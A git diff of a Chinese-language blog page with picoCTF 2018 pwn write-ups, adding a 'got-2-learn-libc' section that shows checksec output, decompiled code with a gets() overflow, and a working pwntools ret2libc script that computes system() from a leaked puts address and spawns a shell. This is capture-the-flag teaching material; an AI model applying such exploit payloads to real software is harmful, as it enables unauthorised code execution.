@@ -72,7 +72,7 @@
 
     
         <meta property="article:published_time" content="10月 02, 2018" />
-        <meta property="article:modified_time" content="10月 04, 2018" />
+        <meta property="article:modified_time" content="10月 05, 2018" />
     
 
     <!-- The Twitter Card protocol -->
@@ -113,7 +113,7 @@
     "headline": "picoctf-Writeup",
     "url": "http://iosmosis.github.io/2018/10/02/picoctf-Writeup/index.html",
     "datePublished": "10月 02, 2018",
-    "dateModified": "10月 04, 2018",
+    "dateModified": "10月 05, 2018",
     "description": "",
     "mainEntityOfPage": {
         "@type": "WebPage",
@@ -343,7 +343,7 @@
 
     
     <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
-        <ol class="post-toc"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#buffer-overflow-0"><span class="post-toc-number">1.</span> <span class="post-toc-text">buffer overflow 0</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#buffer-overflow-1"><span class="post-toc-number">2.</span> <span class="post-toc-text">buffer overflow 1</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#leak-me"><span class="post-toc-number">3.</span> <span class="post-toc-text">leak-me</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#这里先讲一下如何修复"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">这里先讲一下如何修复</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#shellcode"><span class="post-toc-number">4.</span> <span class="post-toc-text">shellcode</span></a></li></ol>
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#buffer-overflow-0"><span class="post-toc-number">1.</span> <span class="post-toc-text">buffer overflow 0</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#buffer-overflow-1"><span class="post-toc-number">2.</span> <span class="post-toc-text">buffer overflow 1</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#leak-me"><span class="post-toc-number">3.</span> <span class="post-toc-text">leak-me</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#这里先讲一下如何修复"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">这里先讲一下如何修复</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#shellcode"><span class="post-toc-number">4.</span> <span class="post-toc-text">shellcode</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#got-2-learn-libc"><span class="post-toc-number">5.</span> <span class="post-toc-text">got-2-learn-libc</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#EXP"><span class="post-toc-number">5.1.</span> <span class="post-toc-text">EXP</span></a></li></ol></li></ol>
         <!--
         <li class="mdl-menu__item">
             Some Action
@@ -728,7 +728,7 @@ ios@ubuntu:~$
 <p>F5报错 </p>
 <p>修复办法 ：</p>
 <p>G跟进地址</p>
-<p><img src="/2018/10/02/picoctf-Writeup/C:/Users\TTTR\ios\source\_posts\picoctf-Writeup\10.jpg" alt="10"></p>
+<p><img src="/2018/10/02/picoctf-Writeup/10.jpg" alt="10"></p>
 <p>keypatch该指令 用nop填充</p>
 <p><img src="/2018/10/02/picoctf-Writeup/11.jpg" alt="11"></p>
 <p>再次按F5</p>
@@ -779,6 +779,96 @@ p<span class="token punctuation">.</span>recv<span class="token punctuation">(</
 p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
 p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
 </code></pre>
+<h3 id="got-2-learn-libc"><a href="#got-2-learn-libc" class="headerlink" title="got-2-learn-libc"></a>got-2-learn-libc</h3><p>检查保护</p>
+<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-bash"><code class="language-bash">ubuntu@ubuntu:~$ checksec got2libc
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ubuntu/got2libc'</span>
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+ubuntu@ubuntu:~$
+</code></pre>
+<p>开启PIE NX RELRO</p>
+<p>载入ida查看流程</p>
+<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  __gid_t v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST1C_4</span>
+
+  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  v3 <span class="token operator">=</span> <span class="token function">getegid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">setresgid</span><span class="token punctuation">(</span>v3<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">sub_618</span><span class="token punctuation">(</span><span class="token number">0x2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"puts: %p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>puts<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fflush %p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fflush<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"read: %p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>read<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"write: %p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>write<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"useful_string: %p\n"</span><span class="token punctuation">,</span> useful_string<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>主流程打印了当前的一些地址  看到还打印了一个useful_string 我们跟进看下 是什么</p>
+<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-c"><code class="language-c"><span class="token punctuation">.</span>data<span class="token punctuation">:</span><span class="token number">00002030</span>                 public useful_string
+<span class="token punctuation">.</span>data<span class="token punctuation">:</span><span class="token number">00002030</span> useful_string   db <span class="token string">'/bin/sh'</span><span class="token punctuation">,</span><span class="token number">0</span>          <span class="token punctuation">;</span> DATA XREF<span class="token punctuation">:</span> main<span class="token operator">+</span>C9↑o
+<span class="token punctuation">.</span>data<span class="token punctuation">:</span><span class="token number">00002038</span>                 align 10h
+<span class="token punctuation">.</span>data<span class="token punctuation">:</span><span class="token number">00002038</span> _data           ends
+</code></pre>
+<p>看到存的binsh</p>
+<p>跟进vuln函数</p>
+<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-9Ch]</span>
+
+  <span class="token function">sub_618</span><span class="token punctuation">(</span><span class="token number">0x2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//存在溢出</span>
+  <span class="token function">sub_618</span><span class="token punctuation">(</span><span class="token number">0x2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token function">sub_618</span><span class="token punctuation">(</span><span class="token number">0x2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>漏洞点也很明显</p>
+<p>思路：</p>
+<p>由于程序打印了puts地址 所以可以根据puts_addr找到libc版本</p>
+<p>通过计算libc_base 从而计算出system_addr</p>
+<p>题目已给出/bin/sh地址所以我们可以直接构造payload</p>
+<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+p <span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'got2libc'</span><span class="token punctuation">)</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'got2libc'</span><span class="token punctuation">)</span>
+puts_plt_offset <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
+puts_got_offset <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
+<span class="token keyword">print</span> hex<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span>
+<span class="token keyword">print</span> hex<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>
+putsaddr <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+puts<span class="token operator">=</span> putsaddr<span class="token punctuation">[</span><span class="token number">41</span><span class="token punctuation">:</span><span class="token number">49</span><span class="token punctuation">]</span>
+binsh<span class="token operator">=</span> putsaddr<span class="token punctuation">[</span><span class="token number">120</span><span class="token punctuation">:</span><span class="token number">128</span><span class="token punctuation">]</span>
+<span class="token comment" spellcheck="true">#puts_plt = 0xf7e0618</span>
+<span class="token comment" spellcheck="true">#puts_got = 0xf7e01fe4</span>
+<span class="token comment" spellcheck="true">#payload = 'A'*0x9C+'bbbb'+p32(puts_plt)+p32(0xf7e0803)+p32(puts_got)</span>
+
+<span class="token comment" spellcheck="true">#p.sendline(payload)</span>
+<span class="token comment" spellcheck="true">#log.info(p.recvuntil('Thanks! Exiting now...\n'))</span>
+<span class="token comment" spellcheck="true">#data = p.recvuntil('\n', drop=True)</span>
+<span class="token comment" spellcheck="true">#puts = u32(data.ljust(4,'\x00'))</span>
+
+system <span class="token operator">=</span> int<span class="token punctuation">(</span>puts<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x05fca0</span><span class="token operator">+</span><span class="token number">0x03ada0</span>
+
+payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x9C</span><span class="token operator">+</span><span class="token string">'bbbb'</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x1553155</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>int<span class="token punctuation">(</span>binsh<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre>
+<p>注意str与int的转换</p>
+<p>这里的system计算是通过<a href="https://libc.blukat.me" target="_blank" rel="external">https://libc.blukat.me</a></p>
+<p><img src="/2018/10/02/picoctf-Writeup/13.jpg" alt="13"></p>
+<p><img src="/2018/10/02/picoctf-Writeup/14.jpg" alt="14"></p>
+<p>成功拿到shell</p>
 
     
 
@@ -798,7 +888,7 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
             <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
     <!-- Prev Nav -->
     
-        <a href="/2018/08/22/网鼎杯部分PWN-Writeup/" id="post_nav-newer" class="prev-content">
+        <a href="/2018/08/22/═°╢ж▒н▓┐╖╓PWN-Writeup/" id="post_nav-newer" class="prev-content">
             <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
                 <i class="material-icons">arrow_back</i>
             </button>
